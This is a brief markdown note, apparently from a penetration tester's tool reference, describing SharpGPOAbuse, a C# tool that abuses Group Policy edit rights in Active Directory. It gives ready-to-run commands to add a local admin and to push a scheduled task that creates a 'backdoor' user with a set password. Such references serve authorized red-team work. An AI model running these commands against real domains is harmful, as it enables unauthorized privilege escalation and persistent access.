---
tags:
  - tool
---
# SharpGPOAbuse

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) is a .NET application written in C# that can be used to take advantage of a user's edit rights on a Group Policy Object (GPO) in order to compromise the objects that are controlled by that GPO.

## Capabilities

```powershell
# Exploit GPO rights to add our user as a local admin to the target GPO
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount gabriel --GPOName 'TestGPO'

# Exploit GPO rights to add a user as admin via immediate machine task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName Backdoor --Author Administrator --Command 'C:\Windows\System32\cmd.exe' --Arguments '/c net user backdoor Password123! /add' --GPOName Backdoor
```
